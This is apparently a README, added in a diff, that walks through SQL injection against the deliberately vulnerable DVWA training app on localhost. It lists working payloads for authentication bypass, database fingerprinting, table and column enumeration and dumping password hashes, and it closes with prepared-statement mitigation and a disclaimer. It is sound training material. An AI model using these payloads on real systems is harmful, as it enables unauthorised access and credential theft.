@@ -1,0 +1,99 @@
+DVWA SQL Injection Exploitation Guide
+
+This project demonstrates how SQL Injection vulnerabilities can be exploited using the Damn Vulnerable Web Application (DVWA). It includes screenshots and payloads that reveal sensitive database information and bypass authentication mechanisms.
+
+🔐 Setup Instructions
+
+Install XAMPP and start Apache & MySQL.
+
+Download DVWA from GitHub and place it in htdocs (e.g., C:\xampp\htdocs\DVWA).
+
+Rename config/config.inc.php.dist → config.inc.php and configure:
+
+$_DVWA['db_server']   = '127.0.0.1';
+$_DVWA['db_user']     = 'root';
+$_DVWA['db_password'] = '';
+$_DVWA['db_database'] = 'dvwa';
+$_DVWA['db_port']     = '3306';
+
+Visit http://localhost/DVWA/setup.php and click Create/Reset Database.
+
+Login at http://localhost/DVWA/login.php using:
+
+Username: admin
+
+Password: password
+
+Set DVWA Security Level to Low.
+
+🧪 Exploitation Chain
+
+1. Authentication Bypass
+
+Payload: ' OR '1'='1
+
+Result: Returns all users, bypassing login logic.
+
+2. Database Name Extraction
+
+Payload: 1' UNION SELECT null, database() --
+
+Result: Reveals current database name (dvwa).
+
+3. MySQL Version Fingerprinting
+
+Payload: 1' UNION SELECT null, version() --
+
+Result: Reveals server version (e.g., 10.4.32-MariaDB).
+
+4. Table Enumeration
+
+Payload: 1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema='dvwa' --
+
+Result: Lists internal tables: users, guestbook, access_log, etc.
+
+5. Column Enumeration (optional)
+
+Payload: 1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' --
+
+Result: Reveals column names like user, password.
+
+6. Dump User Credentials (optional)
+
+Payload: 1' UNION SELECT user, password FROM users --
+
+Result: Displays usernames and password hashes.
+
+🛡️ Mitigation
+
+Set DVWA Security Level to High or Impossible.
+
+Re-run payloads → injection fails.
+
+Real-world fix: use prepared statements:
+
+$stmt = $mysqli->prepare("SELECT user FROM users WHERE id = ?");
+$stmt->bind_param("i", $id);
+$stmt->execute();
+
+📸 Screenshots Included
+
+SQL Injection payloads and results.
+
+Authentication bypass.
+
+Database and table enumeration.
+
+MySQL version fingerprinting.
+
+📚 References
+
+DVWA GitHub
+
+OWASP SQL Injection Guide
+
+
+
+⚠️ Disclaimer
+
+This project is for educational purposes only. Do not attempt these techniques on real systems without permission.
